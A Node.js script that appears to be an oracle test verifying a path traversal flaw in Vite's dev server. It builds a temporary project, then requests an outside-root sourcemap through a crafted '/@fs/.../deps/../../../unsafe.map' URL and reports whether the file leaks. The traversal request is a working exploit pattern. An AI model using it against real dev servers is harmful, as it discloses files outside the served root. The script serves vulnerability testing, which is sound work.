const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-map-traversal-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'root');
    const srcDir = path.join(root, 'src');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><script type="module" src="/src/main.js"></script>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const benignValue = 7; console.log(benignValue);');
    fs.writeFileSync(path.join(depsDir, 'entry.js'), 'export default 1;');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, sources: [], names: [], mappings: '', leaked: marker }));

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { host: true, port: 0, fs: { strict: true } },
      optimizeDeps: { noDiscovery: true }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || !benign.code.includes('benignValue')) {
      throw new Error('benign operation failed');
    }

    operation_completed = true;

    const fsPrefixBase = '/@fs/' + root.split(path.sep).join('/');
    const maliciousUrl = fsPrefixBase + '/node_modules/.vite/deps/../../../unsafe.map';

    const result = await new Promise((resolve, reject) => {
      const chunks = [];
      const req = { method: 'GET', url: maliciousUrl, headers: {} };
      const res = {
        statusCode: 200,
        setHeader() {},
        getHeader() { return undefined; },
        removeHeader() {},
        writeHead(code) { this.statusCode = code; return this; },
        write(chunk) { if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk))); return true; },
        end(chunk) {
          if (chunk != null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          resolve({ statusCode: this.statusCode, body: Buffer.concat(chunks).toString('utf8') });
        }
      };
      try {
        server.middlewares(req, res, (err) => {
          if (err) reject(err);
          else resolve({ statusCode: res.statusCode, body: Buffer.concat(chunks).toString('utf8') });
        });
      } catch (e) {
        reject(e);
      }
    });

    if (result && typeof result.body === 'string' && result.body.includes(marker)) {
      exploit_succeeded = true;
      evidence = 'leaked marker from outside-root .map file via optimized-deps sourcemap URL';
    } else {
      exploit_succeeded = false;
      evidence = 'outside-root marker was not disclosed';
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'runtime_failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();